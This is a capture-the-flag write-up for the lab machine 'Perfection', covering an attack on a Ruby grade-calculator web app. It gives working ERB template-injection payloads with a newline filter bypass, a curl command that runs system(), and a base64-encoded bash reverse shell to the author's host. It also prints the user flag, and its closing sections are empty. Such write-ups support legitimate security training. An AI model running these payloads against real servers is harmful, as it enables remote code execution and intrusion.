= Perfection

Author:: 0x42697262
Category:: Linux
Difficulty:: Easy
Play Date:: 2024/05/20 - 2024/06/19

== Introduction

A vulnerable Ruby web server hosted on Linux.

== Reconnaissance

. Scan the web server ``10.10.11.253`` for open ports.
. Find potential vulnerabilities.
. Try to exploit them.
. Get Flag.

=== NMAP Scan

Scan with nmap

----
$ nmap -sS -sV -sC -O -oN perfection.txt 10.10.11.253

Nmap scan report for 10.10.11.253
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) <.>
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx <.>
|_http-title: Weighted Grade Calculator
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/20%OT=22%CT=1%CU=35182%PV=Y%DS=2%DC=I%G=Y%TM=664B539
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1
OS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
----
<.> SSH Port Open
<.> HTTP Port Open

*OpenSSH 8.9p1* doesn't seem to have any obvious vulnerabilities.
I looked through Metasploit to see if there are any exploits for that version.
I found nothing usable as of my knowledge.

However, browsing the web server might give more clues.

=== Ruby Web Server

Opening ``http://10.10.11.253:80/`` returns the home page.

.Weighted Grade Calculator Home Page
image::perfection/web-home.png[]

While reading the web server, it appears that the web server were made by security students who are probably inexperienced.
So, I went and checked their web app.

.Weighted Grade Calculator Web App
image::perfection/web-calc.png[]

There were inputs.
Bingo!
One should not easily assume it's vulnerable but I can always test it.

Thus, I tried to use the web app normally.
It worked as expected.
However, the web app doesn't make a POST request if the categories are not completely filled.
The sum of the *Weight (%)* must all equal to *100%*.

.Basic Input
image::perfection/input1.png[]

Since this is a web application, the next thing I wanted to see is the *request* and *response* of the web app.
It returns a response of JSON data.

.Basic Input Log
image::perfection/result1.png[]

But it appears that the values are placed directly on the page.
Should I try doing XSS?
Will there be input sanitization?
What's the point of XSS anyway?
Okay, if not XSS, then some sort of injection can be used, right?

.Result HTML Source
image::perfection/result-html-source.png[]

But since I didn't wanna keep typing the inputs into the form, I copied the POST request as cURL command.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Your total grade is 10%<p>a: 1%</p><p>b: 2%</p><p>c: 3%</p><p>d: 3%</p><p>e: 1%</p>
----

I added some grep commands to only output what I needed.

.cURL Command
image::perfection/curl-base.png[]

The command is too long, I tried trimming it down to one category but this just results in ``Malicious input blocked``.
Something not what I want.

I tried changing one of the category values into ``<script>alert(1);</script>``.
That didn't work.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=<script>alert(1);</script>&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Malicious input blocked
----

I kept wondering why it wouldn't work.
Then I realized that web browsers tends to encode the data of the request body.
Thus, I tried doing that.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Malicious input blocked
----

But oh well, the same exact result.
Bummer.

I tried using the symbols ``( ) < > ; [ ] { }`` individually yet it still resulted the same error.

I didn't know what kind of web server I am dealing with, I wanted to know what framework is used as backend.
Turns out the answer was at the bottom of the website: ``WEBrick 1.7.0``.
This is a *Ruby HTTP server toolkit*.
Now, that's a progress.

I looked for exploits related to version *1.7.0* but the results on the web shows different versions and old as well.
I didn't know what I was doing.
I was lost.
I didn't know what to look for.
I searched and read more about attacks on web servers and I found what I needed, *Server Side Template Injection*.

=== Server Side Template Injection

Ruby got lots of templating engine but the common ones are *Embedded Ruby (ERB)* and *Slim*.
I tried my luck with ERB by testing ``<%= Dir.entries('/') %>`` (which I found https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md[here]).
Of course that didn't work as I would just get this error:

----
Invalid query parameters: invalid %-encoding (&amp;lt;%= Dir.entries(&amp;#x2F;) %&amp;gt;)
----

I forgot to encode it...
When encoded, the result is still the same.
Giving a malicious input blocked.

.Encoded SSTI
----
%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E
----

Once again, I am back on having to deal with bypassing the sanitization.
Apparently, all we have to do is add a ``%0A`` newline encoded character before the input.
But for it to work, there should be at least one valid character before it.

I didn't understand why that works.
This will be explained later on.

----
a%0A%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E <.>
----
<.> Added ``a%0A``.

And we're able to show the results!

.Working SSTI
----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0a%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked" -A 2

Your total grade is 10%<p>a: 1%</p><p>b: 2%</p><p>c: 3%</p><p>d: 3%</p><p>a
["dev", "libx32", "srv", "lib", "usr", "bin", "lib64", "lost+found", "sys", "var", "media", "tmp", "proc", "boot", "home", "opt", "lib32", "sbin", "run", "etc", "mnt", "..", "root", "."]: 1%</p>
    </div>
----

We can now create a reverse shell!


== Exploitation

Before creating a reverse shell, I wanted to see if I can ping my host machine.

.Check connection with tcpdump 
----
$ tcpdump -i tun0 -A icmp

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
----

Then made a ping request.

.ERB Ping Request
----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0A%3C%25%3D%20system(%27ping%20-c1%2010.10.16.11%27)%20%25%3E&grade5=10&weight5=10'
----

.Output of tcpdump after a ping request
----
20:37:26.149125 IP 10.10.11.253 > 10.10.16.11: ICMP echo request, id 6, seq 1, length 64
E..T.N@.?.V?

..

..........w.tf....c....................... !"#$%&'()*+,-./01234567
20:37:26.149149 IP 10.10.16.11 > 10.10.11.253: ICMP echo reply, id 6, seq 1, length 64
E..T1...@...

..

..........w.tf....c....................... !"#$%&'()*+,-./01234567
----

Meaning, it's possible to connect from the web server to my machine!

I then setup netcat for reverse shell.

----
$ nc -lvnp 6969 <.>

listening on [any] 6969 ...
----
<.> Pick any port you like

I didn't like how I have to input the commands in the terminal so I made a Python script that will make a POST request to the server and make a reverse shell connection.

[,python]
----
include::attachment$perfection/perfection.py[]
----

The script is equivalent to executing

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0A%3C%25%3D+system%28%22echo+%27MDwmMTk2OyBleGVjIDE5Njw%2BL2Rldi90Y3AvMTAuMTAuMTYuMTEvNjk2OTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2%27+%7C+base64+--decode+%7C+bash%22%29+%25%3E&grade5=10&weight5=10'
----

.Reverse Shell Success
image::perfection/reverse_shell.png[]


=== User Flag

Woops.
Here's the user flag.

----
$ cat ~/user.txt

a492e9d8a7e5c4d0cc14e27ce647d655
----

=== Root Flag

== Post-Exploitation

== Challenge Summaries

== Lessons Learned

== Conclusion


[IMPORTANT] 
.Flag
==== 
user:

root:
====

